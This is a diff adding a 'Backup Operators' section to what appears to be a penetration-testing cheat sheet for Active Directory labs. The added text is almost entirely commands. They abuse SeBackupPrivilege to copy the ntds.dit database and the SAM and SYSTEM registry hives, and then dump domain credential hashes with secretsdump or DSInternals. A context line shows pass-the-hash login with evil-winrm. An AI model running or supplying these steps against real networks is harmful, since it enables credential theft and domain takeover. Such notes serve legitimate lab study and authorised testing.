@@ -41,6 +41,38 @@ PassTheHash:
 ```
 evil-winrm -i 10.129.8.25 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
 ```
+## Backup Operators
+Enabling and importing
+```
+Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+Set-SeBackupPrivilege
+Get-SeBackupPrivilege
+```
+Copying a Protected File
+```
+robocopy /B E:\Windows\NTDS .\ntds ntds.dit
+Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
+```
+Explotation
+Backup the C: in E:
+```
+diskshadow.exe
+```
+Copy files
+```
+Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
+reg save HKLM\SYSTEM SYSTEM.SAV
+reg save HKLM\SAM SAM.SAV
+```
+Extracting credentials
+```
+secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+OR
+Import-Module .\DSInternals.psd1
+$key = Get-BootKey -SystemHivePath .\SYSTEM
+Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
+```
 
 # Roles
 ## GenericAll
